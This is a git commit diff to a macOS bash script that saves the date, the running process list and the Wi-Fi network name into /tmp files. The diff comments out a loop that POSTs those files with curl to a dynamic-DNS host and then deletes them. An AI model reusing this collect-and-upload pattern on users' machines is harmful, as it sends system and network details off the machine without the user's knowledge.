7e7c7e9ac783323d0318d6e333e7d5b31892c06e
Kirill Kochubey <kirill.kochubey@gmail.com>
2016-05-01 00:04:22 -0700

    Update check_n.sh

--- mac/check_n.sh
+++ mac/check_n.sh
@@ -1,15 +1,16 @@
 #!/bin/bash
 
 echo $(date) > /tmp/screen_mac_date.txt
+ps -ef > /tmp/screen_mac_psef.txt
 
 sleep 2
 
-find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
-  echo "uploading $file"
-  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
-  # sleep 1
-  rm $file 
-done
+#find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
+#  echo "uploading $file"
+#  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
+#  # sleep 1
+#  rm $file 
+#done
 
 networksetup -getairportnetwork en0 > /tmp/screen_mac_get_airport_net.txt || true
 
